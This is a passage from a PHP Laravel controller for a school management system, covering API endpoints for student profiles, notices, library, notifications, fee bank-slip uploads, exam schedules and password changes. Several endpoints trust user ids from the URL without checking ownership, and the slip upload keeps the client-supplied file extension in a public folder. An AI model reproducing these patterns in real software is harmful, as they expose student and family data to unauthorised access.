        $fees_assigneds = AramiscFeesAssign::where('student_id', $student_detail->id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
        $fees_discounts = AramiscFeesAssignDiscount::where('student_id', $student_detail->id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
        $documents = AramiscStudentDocument::where('student_staff_id', $student_detail->id)->where('type', 'stu')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
        $timelines = AramiscStudentTimeline::where('staff_student_id', $student_detail->id)->where('type', 'stu')->where('visible_to_student', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
        $exams = AramiscExamSchedule::where('class_id', $student_detail->class_id)->where('section_id', $student_detail->section_id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
        $grades = AramiscMarksGrade::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

        $academic_year = AramiscAcademicYear::find($student_detail->session_id);
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = [];
            $data['student_detail'] = $student_detail->toArray();
            $data['fees_assigneds'] = $fees_assigneds->toArray();
            $data['fees_discounts'] = $fees_discounts->toArray();
            $data['exams'] = $exams->toArray();
            $data['documents'] = $documents->toArray();
            $data['timelines'] = $timelines->toArray();
            $data['siblings'] = $siblings->toArray();
            $data['grades'] = $grades->toArray();
            return ApiBaseMethod::sendResponse($data, null);
        }

        return view('backEnd.studentPanel.my_profile', compact('driver', 'academic_year', 'student_detail', 'fees_assigneds', 'fees_discounts', 'exams', 'documents', 'timelines', 'siblings', 'grades'));
    }
    public function saas_studentDashboard(Request $request,$school_id, $id = null)
    {

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $user_id = $id;
        } else {
            $user = Auth::user();

            if ($user) {
                $user_id = $user->id;
            } else {
                $user_id = $request->user_id;
            }
        }

        $student_detail = AramiscStudent::where('user_id', $user_id)->where('school_id',$school_id)->first();
        $driver = AramiscVehicle::where('aramisc_vehicles.id', '=', @$student_detail->vechile_id)
            ->join('aramisc_staffs', 'aramisc_staffs.id', '=', 'aramisc_vehicles.driver_id')
            ->where('aramisc_vehicles.school_id',$school_id)
            ->first();
        $siblings = AramiscStudent::where('parent_id', @$student_detail->parent_id)->where('school_id',$school_id)->get();
        $fees_assigneds = AramiscFeesAssign::where('student_id', @$student_detail->id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
        $fees_discounts = AramiscFeesAssignDiscount::where('student_id', @$student_detail->id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
        $documents = AramiscStudentDocument::where('student_staff_id', @$student_detail->id)->where('type', 'stu')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
        $timelines = AramiscStudentTimeline::where('staff_student_id', @$student_detail->id)->where('type', 'stu')->where('visible_to_student', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
        $exams = AramiscExamSchedule::where('class_id', @$student_detail->class_id)->where('section_id', @$student_detail->section_id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
        $grades = AramiscMarksGrade::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

        $academic_year = AramiscAcademicYear::find(@$student_detail->session_id);
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = [];
            $data['student_detail'] = @$student_detail->toArray();
            $data['fees_assigneds'] = $fees_assigneds->toArray();
            $data['fees_discounts'] = $fees_discounts->toArray();
            $data['exams'] = $exams->toArray();
            $data['documents'] = $documents->toArray();
            $data['timelines'] = $timelines->toArray();
            $data['siblings'] = $siblings->toArray();
            $data['grades'] = $grades->toArray();
            return ApiBaseMethod::sendResponse($data, null);
        }

        return view('backEnd.studentPanel.my_profile', compact('driver', 'academic_year', 'student_detail', 'fees_assigneds', 'fees_discounts', 'exams', 'documents', 'timelines', 'siblings', 'grades'));
    }

    public function studentNoticeboard(Request $request)
    {
        $data = [];
        $allNotices = AramiscNoticeBoard::where('active_status', 1)->where('inform_to', 'LIKE', '%2%')
            ->orderBy('id', 'DESC')
            ->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {

            $data['allNotices'] = $allNotices->toArray();

            return ApiBaseMethod::sendResponse($data, null);
        }
        return view('backEnd.studentPanel.studentNoticeboard', compact('allNotices'));
    }
    public function saas_studentNoticeboard(Request $request, $school_id)
    {
        $data = [];
        $allNotices = AramiscNoticeBoard::withOutGlobalScope(StatusAcademicSchoolScope::class)
                                    ->where('active_status', 1)
                                    ->where('inform_to', 'LIKE', '%2%')
                                    ->orderBy('id', 'DESC')
                                    ->where('academic_id', AramiscAcademicYear::API_ACADEMIC_YEAR($school_id))
                                    ->where('school_id',$school_id)->get();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data['allNotices'] = $allNotices->toArray();
            return ApiBaseMethod::sendResponse($data, null);
        }
        return view('backEnd.studentPanel.studentNoticeboard', compact('allNotices'));
    }
    public function studentSubjectApi(Request $request, $id, $record_id)
    {

        $student = AramiscStudent::withOutGlobalScope(SchoolScope::class)->where('user_id', $id)->first();
        $record = StudentRecord::where('id', $record_id)->where('student_id', $student->id)->first();
        $assignSubjects = DB::table('aramisc_assign_subjects')
            ->leftjoin('aramisc_subjects', 'aramisc_subjects.id', '=', 'aramisc_assign_subjects.subject_id')
            ->leftjoin('aramisc_staffs', 'aramisc_staffs.id', '=', 'aramisc_assign_subjects.teacher_id')
            ->select('aramisc_subjects.id','aramisc_subjects.subject_name', 'aramisc_subjects.subject_code', 'aramisc_subjects.subject_type', 'aramisc_staffs.full_name as teacher_name')
            ->where('aramisc_assign_subjects.class_id', '=', $record->class_id)
            ->where('aramisc_assign_subjects.section_id', '=', $record->section_id)
            ->where('aramisc_assign_subjects.academic_id', AramiscAcademicYear::API_ACADEMIC_YEAR($request->user()->school_id))->get();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = [];
             $data['student_subjects'] = $assignSubjects->map(function($v){
                    $v->id = (int) $v->id;
                    return $v;
                })->toArray();
            return ApiBaseMethod::sendResponse($data, null);
        }
    }
    public function saas_studentSubjectApi(Request $request,$school_id, $id, $record_id)
    {
        try{
            $student = AramiscStudent::withOutGlobalScope(SchoolScope::class)->where('user_id', $id)->where('school_id',$school_id)->first();
            $record = StudentRecord::where('id', $record_id)->where('student_id', $student->id)->first();
            
            $assignSubjects = DB::table('aramisc_assign_subjects')
                ->leftjoin('aramisc_subjects', 'aramisc_subjects.id', '=', 'aramisc_assign_subjects.subject_id')
                ->leftjoin('aramisc_staffs', 'aramisc_staffs.id', '=', 'aramisc_assign_subjects.teacher_id')
                ->select('aramisc_subjects.id','aramisc_subjects.subject_name', 'aramisc_subjects.subject_code', 'aramisc_subjects.subject_type', 'aramisc_staffs.full_name as teacher_name')
                ->where('aramisc_assign_subjects.class_id', '=', @$record->class_id)
                ->where('aramisc_assign_subjects.section_id', '=', @$record->section_id)
                ->where('aramisc_assign_subjects.academic_id', AramiscAcademicYear::API_ACADEMIC_YEAR($request->user()->school_id))->where('aramisc_assign_subjects.school_id',$school_id)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['student_subjects'] = $assignSubjects->map(function($v){
                    $v->id = (int) $v->id;
                    return $v;
                })->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
        } 
        catch (\Exception $e) {
        }       

    }
    public function studentLibrary(Request $request, $id)
    {

        $student = AramiscStudent::where('user_id', $id)->first();
        $issueBooks = DB::table('aramisc_book_issues')
            ->leftjoin('aramisc_books', 'aramisc_books.id', '=', 'aramisc_book_issues.book_id')
            ->where('aramisc_book_issues.member_id', '=', $student->user_id)
            ->get();


        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = [];
            $data['issueBooks'] = $issueBooks->toArray();

            return ApiBaseMethod::sendResponse($data, null);
        }
    }
    public function saas_studentLibrary(Request $request,$school_id, $id)
    {

        $student = AramiscStudent::where('user_id', $id)->where('school_id',$school_id)->first();
        $issueBooks = DB::table('aramisc_book_issues')
            ->leftjoin('aramisc_books', 'aramisc_books.id', '=', 'aramisc_book_issues.book_id')
            ->where('aramisc_book_issues.member_id', '=', @$student->user_id)
            ->where('aramisc_book_issues.school_id',$school_id)
            ->get();


        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = [];
            $data['issueBooks'] = $issueBooks->toArray();

            return ApiBaseMethod::sendResponse($data, null);
        }
    }


    /**
     * myNotification
     * @response{
     * "success": true,
     * "data": {
     *     "unread_notification": 3,
     *     "notifications": [
     *     {
     *         "id": 4,
     *         "date": "2021-04-05",
     *         "message": "assignment updated",
     *         "url": "student-assignment",
     *         "created_at": "2021-04-05T11:48:06.000000Z",
     *         "is_read": 0
     *     },
     *     {
     *         "id": 6,
     *         "date": "2021-04-05",
     *         "message": "Syllabus updated",
     *         "url": "student-syllabus",
     *         "created_at": "2021-04-05T13:49:51.000000Z",
     *         "is_read": 0
     *     },
     *     {
     *         "id": 8,
     *         "date": "2021-04-05",
     *         "message": "Others Download updated",
     *         "url": "student-others-download",
     *         "created_at": "2021-04-05T13:51:17.000000Z",
     *         "is_read": 0
     *     }
     *     ]
     * },
     * "message": null
     * }
     */

    public function myNotification(Request $request, $user_id){

        $unread_notification = AramiscNotification::where('user_id',$user_id)
            ->where('is_read',0)
            ->count();
        $notifications = AramiscNotification::where('user_id',$user_id)
            ->where('is_read',0)->latest()
            ->get(['id','date','message','url','created_at','is_read']);

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = [];
            $data['unread_notification'] = @$unread_notification;
            $data['notifications'] = @$notifications->toArray();
            return ApiBaseMethod::sendResponse($data, null);
        }

    }

    /**
     * viewNotification
     * @response {
     *      "success": true,
     *      "data": {
     *          "message": "Notification view successfully",
     *          "unread_notification": 1,
     *          "notifications": [
     *          {
     *              "id": 8,
     *              "date": "2021-04-05",
     *              "message": "Others Download updated",
     *              "url": "student-others-download",
     *              "created_at": "2021-04-05T13:51:17.000000Z",
     *              "is_read": 0
     *          }
     *          ]
     *      },
     *      "message": null
     *      }
     */


    public function viewNotification(Request $request, $user_id, $notification_id){


        $notification = AramiscNotification::where('user_id',$user_id)
            ->where('id',$notification_id)
            ->first();

        if($notification){
            $notification->is_read = 1;
            $notification->save();
        }

        $unread_notification = AramiscNotification::where('user_id',$user_id)
            ->where('is_read',0)
            ->count();
        $notifications = AramiscNotification::where('user_id',$user_id)->where('is_read',0)->latest()
            ->get(['id','date','message','url','created_at','is_read']);

        if(ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = [];
            $data['message'] = "Notification view successfully";
            $data['unread_notification'] = $unread_notification;
            $data['notifications'] = $notifications->toArray();
            $data['status'] = true;
            return ApiBaseMethod::sendResponse($data, null);
        }

    }
    /**
     * viewAllNotification
     * @response {
     *      "success": true,
     *      "data": {
     *          "message": "Notification view successfully",
     *          "unread_notification": 0,
     *          "notifications": [
     *          {
     *              "id": 8,
     *              "date": "2021-04-05",
     *              "message": "Others Download updated",
     *              "url": "student-others-download",
     *              "created_at": "2021-04-05T13:51:17.000000Z",
     *              "is_read": 0
     *          }
     *          ]
     *      },
     *      "message": null
     *      }
     */
    public function viewAllNotification(Request $request,$user_id){
        try{
            $user =User::find($user_id);

            if($user->role_id != 1){

                if($user->role_id == 2){
                    $mark_all=AramiscNotification::where('user_id', $user_id)->where('role_id', 2)->update(['is_read' => 1]);

                }elseif($user->role_id == 3){
                    $mark_all=AramiscNotification::where('user_id', $user_id)->where('role_id', '!=', 2)->update(['is_read' => 1]);

                }else{
                    $mark_all=AramiscNotification::where('user_id', $user_id)->where('role_id', '!=', 2)->where('role_id', '!=', 3)->update(['is_read' => 1]);

                }
            }else{
                $mark_all=AramiscNotification::where('user_id', $user_id)->where('role_id', 1)->update(['is_read' => 1]);

            }

            $notifications = AramiscNotification::where('user_id',$user_id)->where('is_read',0)->latest()
                ->get(['id','date','message','url','created_at','is_read']);

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['message'] = "Notification view successfully";
                $data['mark_all'] = $mark_all;
                $data['notifications'] = $notifications->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }

        }catch (\Exception $e) {
            Toastr::error('Operation Failed', 'Failed');
            return redirect()->back();
        }
    }


    public function bankList(Request $request){
        try {
            $banks=AramiscBankAccount::where('active_status',1)
                ->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())
                ->where('school_id',1)->get(['id','bank_name','account_name','account_number']);
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['banks'] = $banks->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
        } catch (\Throwable $th) {

        }

    }



    public function childBankSlipStore(Request $request)
    {
        if(ApiBaseMethod::checkUrl($request->fullUrl())){
            $input = $request->all();
            $validator = Validator::make($input, [

                'amount'=> "required",
                'class_id' =>"required",
                'section_id'=>"required",
                'user_id'=>"required",
                'fees_type_id'=>"required",
                'payment_mode'=>"required",
                'date'=>"required",


            ]);
        }
        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
        }

        try {

            if($request->payment_mode=="bank"){
                if($request->bank_id==''){
                    if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                        return ApiBaseMethod::sendError('Bank Field Required');
                    }
                }
            }


            $fileName = "";
            if ($request->file('slip') != "") {
                $file = $request->file('slip');
                $fileName = $request->input('user_id') . time() . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/bankSlip/',$fileName);
                $fileName = 'public/uploads/bankSlip/' . $fileName;
            }

            $student=AramiscStudent::where('user_id',$request->user_id)->first();

            $date = strtotime($request->date);
            $newformat = date('Y-m-d', $date);
            $payment_mode_name=ucwords($request->payment_mode);
            $payment_method=AramiscPaymentMethhod::where('method',$payment_mode_name)->first();

            $payment = new AramiscBankPaymentSlip();
            $payment->date = $newformat;
            $payment->amount = $request->amount;
            $payment->note = $request->note;
            $payment->slip = $fileName;
            $payment->fees_type_id = $request->fees_type_id;
            $payment->student_id = $student->id;
            $payment->payment_mode = $request->payment_mode;
            if($payment_method->id==3){
                $payment->bank_id = $request->bank_id;
            }
            $payment->class_id = $request->class_id;
            $payment->section_id = $request->section_id;
            $payment->school_id = 1;
            $payment->academic_id = AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR();
            $result=$payment->save();

            if($result){
                $users = User::whereIn('role_id',[1,5])->where('school_id', 1)->get();
                foreach($users as $user){
                    $notification = new AramiscNotification();
                    $notification->message = $student->full_name .'Payment Recieve';
                    $notification->is_read = 0;
                    $notification->url = "bank-payment-slip";
                    $notification->user_id = $user->id;
                    $notification->role_id = $user->role_id;
                    $notification->school_id = 1;
                    $notification->academic_id = $student->academic_id;
                    $notification->date = date('Y-m-d');
                    $notification->save();
                }
            }


            if(ApiBaseMethod::checkUrl($request->fullUrl())){
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Payment Added, Please Wait for approval');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again');
                }
            }

        } catch (\Exception $e) {

            Toastr::error('Operation Failed', 'Failed');
            return redirect()->back();
        }
    }

    public function saas_studentAssignmentApi(Request $request,$school_id, $id)
    {

        $student_detail = AramiscStudent::where('user_id', $id)->where('school_id',$school_id)->first();
        $uploadContents = AramiscTeacherUploadContent::where('content_type', 'as')
            ->select('content_title', 'upload_date', 'description', 'upload_file')
            ->where(function ($query) use ($student_detail) {
                $query->where('available_for_all_classes', 1)
                    ->orWhere([['class', @$student_detail->class_id], ['section', @$student_detail->section_id]]);
            })->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = [];
            $data['student_detail'] = @$student_detail->toArray();
            $data['uploadContents'] = @$uploadContents->toArray();
            return ApiBaseMethod::sendResponse($data, null);
        }
    }
    public function studentsDocumentApi(Request $request, $id)
    {

        $student_detail = AramiscStudent::where('user_id', $id)->first();
        $documents = AramiscStudentDocument::where('student_staff_id', $student_detail->id)->where('type', 'stu')
            ->select('title', 'file')
            ->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = [];
            $data['student_detail'] = $student_detail->toArray();
            $data['documents'] = $documents->toArray();
            return ApiBaseMethod::sendResponse($data, null);
        }
    }
    public function saas_studentsDocumentApi(Request $request,$school_id, $id)
    {

        $student_detail = AramiscStudent::where('user_id', $id)->where('school_id',$school_id)->first();
        $documents = AramiscStudentDocument::where('student_staff_id', @$student_detail->id)->where('type', 'stu')
            ->select('title', 'file')
            ->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = [];
            $data['student_detail'] = @$student_detail->toArray();
            $data['documents'] = @$documents->toArray();
            return ApiBaseMethod::sendResponse($data, null);
        }
    }
    public function studentDormitoryApi(Request $request)
    {
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {

            $studentDormitory = DB::table('aramisc_room_lists')
                ->join('aramisc_dormitory_lists', 'aramisc_room_lists.dormitory_id', '=', 'aramisc_dormitory_lists.id')
                ->join('aramisc_room_types', 'aramisc_room_lists.room_type_id', '=', 'aramisc_room_types.id')
                ->select('aramisc_dormitory_lists.dormitory_name', 'aramisc_room_lists.name as room_number', 'aramisc_room_lists.number_of_bed', 'aramisc_room_lists.cost_per_bed', 'aramisc_room_lists.active_status')->get();

            return ApiBaseMethod::sendResponse($studentDormitory, null);
        }
    }
    public function saas_studentDormitoryApi(Request $request, $school_id)
    {
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {

            $studentDormitory = DB::table('aramisc_room_lists')
                ->join('aramisc_dormitory_lists', 'aramisc_room_lists.dormitory_id', '=', 'aramisc_dormitory_lists.id')
                ->join('aramisc_room_types', 'aramisc_room_lists.room_type_id', '=', 'aramisc_room_types.id')
                ->select('aramisc_dormitory_lists.dormitory_name', 'aramisc_room_lists.name as room_number', 'aramisc_room_lists.number_of_bed', 'aramisc_room_lists.cost_per_bed', 'aramisc_room_lists.active_status')->where('aramisc_room_lists.school_id',$school_id)->get();

            return ApiBaseMethod::sendResponse($studentDormitory, null);
        }
    }
    public function studentExamScheduleApi(Request $request, $id)
    {

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {

            $student_detail = AramiscStudent::where('user_id', $id)->first();

            $exam_schedule = DB::table('aramisc_exam_schedules')
                ->join('aramisc_students', 'aramisc_students.class_id', '=', 'aramisc_exam_schedules.class_id')
                ->join('aramisc_exam_types', 'aramisc_exam_types.id', '=', 'aramisc_exam_schedules.exam_term_id')
                ->join('aramisc_exam_schedule_subjects', 'aramisc_exam_schedule_subjects.exam_schedule_id', '=', 'aramisc_exam_schedules.id')
                ->join('aramisc_subjects', 'aramisc_subjects.id', '=', 'aramisc_exam_schedules.subject_id')
                ->select('aramisc_subjects.subject_name', 'aramisc_exam_schedule_subjects.start_time', 'aramisc_exam_schedule_subjects.end_time', 'aramisc_exam_schedule_subjects.date', 'aramisc_exam_schedule_subjects.room', 'aramisc_exam_schedules.class_id', 'aramisc_exam_schedules.section_id')

                ->where('aramisc_exam_schedules.section_id', '=', $student_detail->section_id)
                ->where('aramisc_exam_schedules.academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();



            return ApiBaseMethod::sendResponse($exam_schedule, null);
        }
    }
    public function saas_studentExamScheduleApi(Request $request,$school_id, $id)
    {

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {

            $student_detail = AramiscStudent::where('user_id', $id)->where('school_id', $school_id)->first();


            $exam_schedule = DB::table('aramisc_exam_schedules')
                ->join('aramisc_students', 'aramisc_students.class_id', '=', 'aramisc_exam_schedules.class_id')
                ->join('aramisc_exam_types', 'aramisc_exam_types.id', '=', 'aramisc_exam_schedules.exam_term_id')
                ->join('aramisc_exam_schedule_subjects', 'aramisc_exam_schedule_subjects.exam_schedule_id', '=', 'aramisc_exam_schedules.id')
                ->join('aramisc_subjects', 'aramisc_subjects.id', '=', 'aramisc_exam_schedules.subject_id')
                ->select('aramisc_subjects.subject_name', 'aramisc_exam_schedule_subjects.start_time', 'aramisc_exam_schedule_subjects.end_time', 'aramisc_exam_schedule_subjects.date', 'aramisc_exam_schedule_subjects.room', 'aramisc_exam_schedules.class_id', 'aramisc_exam_schedules.section_id')


                ->where('aramisc_exam_schedules.section_id', '=', @$student_detail->section_id)
                ->where('aramisc_exam_schedules.academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->
                where('aramisc_exam_schedules.school_id',$school_id)->get();



            return ApiBaseMethod::sendResponse($exam_schedule, null);
        }
    }
    public function studentTimelineApi(Request $request, $id)
    {

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {


            $timelines = DB::table('aramisc_student_timelines')
                ->leftjoin('aramisc_students', 'aramisc_students.id', '=', 'aramisc_student_timelines.staff_student_id')
                ->where('aramisc_student_timelines.type', '=', 'stu')
                ->where('aramisc_student_timelines.active_status', '=', 1)
                ->where('aramisc_students.user_id', '=', $id)
                ->select('title', 'date', 'description', 'file', 'aramisc_student_timelines.active_status')

                ->where('aramisc_student_timelines.academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            return ApiBaseMethod::sendResponse($timelines, null);
        }
    }
    public function saas_studentTimelineApi(Request $request,$school_id, $id)
    {

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {



            $timelines = DB::table('aramisc_student_timelines')
                ->leftjoin('aramisc_students', 'aramisc_students.id', '=', 'aramisc_student_timelines.staff_student_id')
                ->where('aramisc_student_timelines.type', '=', 'stu')
                ->where('aramisc_student_timelines.active_status', '=', 1)
                ->where('aramisc_students.user_id', '=', $id)
                ->select('title', 'date', 'description', 'file', 'aramisc_student_timelines.active_status')

                ->where('aramisc_student_timelines.academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->
                where('aramisc_student_timelines.school_id',$school_id)->get();

            return ApiBaseMethod::sendResponse($timelines, null);
        }
    }




    public function getGrades(Request $request, $marks)
    {
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {


            $grades = DB::table('aramisc_marks_grades')
                ->where('percent_from', '<=', floor($marks))
                ->where('percent_upto', '>=', floor($marks))
                ->select('grade_name')
                ->first();


            return ApiBaseMethod::sendResponse($grades, null);
        }
    }
    public function saas_getGrades(Request $request,$school_id, $marks)
    {
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {


            $grades = DB::table('aramisc_marks_grades')
                ->where('percent_from', '<=', floor($marks))
                ->where('percent_upto', '>=', floor($marks))
                ->select('grade_name')
                ->where('school_id',$school_id)->first();


            return ApiBaseMethod::sendResponse($grades, null);
        }
    }
    public function getSystemVersion(Request $request)
    {

        try {
            $version = AramiscSystemVersion::find(1);
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data['SystemVersion'] = $version;
                return ApiBaseMethod::sendResponse($data, null);
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_getSystemVersion(Request $request)
    {

        try {
            $version = AramiscSystemVersion::find(1);
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data['SystemVersion'] = $version;
                return ApiBaseMethod::sendResponse($data, null);
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function getSystemUpdate(Request $request, $version_upgrade_id = null)
    {

        try {
            $data = [];
            if (Schema::hasTable('aramisc_update_files')) {
                $version = DB::table('aramisc_update_files')->where('version_name', $version_upgrade_id)->first();
                if (!empty($version->path)) {
                    $url = url('/') . '/' . $version->path;
                    header("Location: " . $url);
                    die();
                } else {
                    return redirect()->back();
                }
            }
            return redirect()->back();
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }

    public function updatePassowrdStoreApi(Request $request)
    {

        if(ApiBaseMethod::checkUrl($request->fullUrl())){
            $input = $request->all();
            $validator = Validator::make($input,[
                'current_password' => "required",
                'new_password' => "required|same:confirm_password|min:6|different:current_password",
                'confirm_password' => 'required|min:6'
            ]);
        }
        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
        }
        try {

            $user = User::find($request->id);
            if (Hash::check($request->current_password, $user->password)) {

                $user->password = Hash::make($request->new_password);
                $result = $user->save();
                if(ApiBaseMethod::checkUrl($request->fullUrl())){
                    if ($result) {
                        return ApiBaseMethod::sendResponse(null, 'Password has been changed successfully');
                    } else {
                        return ApiBaseMethod::sendError('Something went wrong, please try again');
                    }
                }
            } else {
                return ApiBaseMethod::sendError('Current password not match!');
                Toastr::error('Current password not match!', 'Failed');

            }
        } catch (\Exception $e) {
            Toastr::error('Operation Failed', 'Failed');
            return redirect()->back();
        }


    }
    public function saas_updatePassowrdStoreApi(Request $request,$school_id)
    {

        $user = User::where('school_id',$school_id)->find($request->id);

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {


            if (Hash::check($request->current_password, @$user->password)) {

                $user->password = Hash::make($request->new_password);
                $result = $user->save();
                $msg = "Password Changed Successfully ";
                return ApiBaseMethod::sendResponse(null, $msg);
            } else {
                $msg = "You Entered Wrong Current Password";
                return ApiBaseMethod::sendError(null, $msg);
            }
        }
    }

    public function childProfileApi(Request $request, $id)
    {
        $student_detail = AramiscStudent::where('id', $id)->first();
        $siblings = AramiscStudent::where('parent_id', $student_detail->parent_id)->where('active_status', 1)->get();
        $fees_assigneds = AramiscFeesAssign::where('student_id', $student_detail->id)->get();
        $fees_discounts = AramiscFeesAssignDiscount::where('student_id', $student_detail->id)->get();
        $documents = AramiscStudentDocument::where('student_staff_id', $student_detail->id)->where('type', 'stu')->get();
        $timelines = AramiscStudentTimeline::where('staff_student_id', $student_detail->id)->where('type', 'stu')->where('visible_to_student', 1)->get();
        $exams = AramiscExamSchedule::where('class_id', $student_detail->class_id)->where('section_id', $student_detail->section_id)->get();
        $grades = AramiscMarksGrade::where('active_status', 1)->get();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = [];
            $data['student_detail'] = $student_detail->toArray();
            $data['fees_assigneds'] = $fees_assigneds->toArray();
            $data['fees_discounts'] = $fees_discounts->toArray();
            $data['exams'] = $exams->toArray();
            $data['documents'] = $documents->toArray();
            $data['timelines'] = $timelines->toArray();
            $data['siblings'] = $siblings->toArray();
            $data['grades'] = $grades->toArray();
            return ApiBaseMethod::sendResponse($data, null);
        }


    }
    public function saas_childProfileApi(Request $request,$school_id, $id)
    {
        $student_detail = AramiscStudent::where('id', $id)->where('school_id',$school_id)->first();
        $siblings = AramiscStudent::where('parent_id', @$student_detail->parent_id)->where('active_status', 1)->where('school_id',$school_id)->get();
        $fees_assigneds = AramiscFeesAssign::where('student_id', @$student_detail->id)->where('school_id',$school_id)->get();
        $fees_discounts = AramiscFeesAssignDiscount::where('student_id', @$student_detail->id)->where('school_id',$school_id)->get();
        $documents = AramiscStudentDocument::where('student_staff_id', @$student_detail->id)->where('type', 'stu')->where('school_id',$school_id)->get();
        $timelines = AramiscStudentTimeline::where('staff_student_id', @$student_detail->id)->where('type', 'stu')->where('visible_to_student', 1)->where('school_id',$school_id)->get();
        $exams = AramiscExamSchedule::where('class_id', @$student_detail->class_id)->where('section_id', @$student_detail->section_id)->where('school_id',$school_id)->get();
        $grades = AramiscMarksGrade::where('active_status', 1)->where('school_id',$school_id)->get();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = [];
            $data['student_detail'] = @$student_detail->toArray();
            $data['fees_assigneds'] = @$fees_assigneds->toArray();
            $data['fees_discounts'] = @$fees_discounts->toArray();
            $data['exams'] = @$exams->toArray();
            $data['documents'] = @$documents->toArray();
            $data['timelines'] = @$timelines->toArray();
            $data['siblings'] = @$siblings->toArray();
            $data['grades'] = @$grades->toArray();
            return ApiBaseMethod::sendResponse($data, null);
        }


    }
    public function collectFeesChildApi(Request $request, $id)
    {

        $student = AramiscStudent::where('id', $id)->first();
        $fees_assigneds = AramiscFeesAssign::where('student_id', $id)->orderBy('id', 'desc')->get();

        $fees_assigneds2 = DB::table('aramisc_fees_assigns')
            ->select('aramisc_fees_types.id as fees_type_id', 'aramisc_fees_types.name', 'aramisc_fees_masters.date as due_date', 'aramisc_fees_masters.amount as amount')
            ->join('aramisc_fees_masters', 'aramisc_fees_masters.id', '=', 'aramisc_fees_assigns.fees_master_id')
            ->join('aramisc_fees_types', 'aramisc_fees_types.id', '=', 'aramisc_fees_masters.fees_type_id')
            ->join('aramisc_fees_payments', 'aramisc_fees_payments.fees_type_id', '=', 'aramisc_fees_masters.fees_type_id')
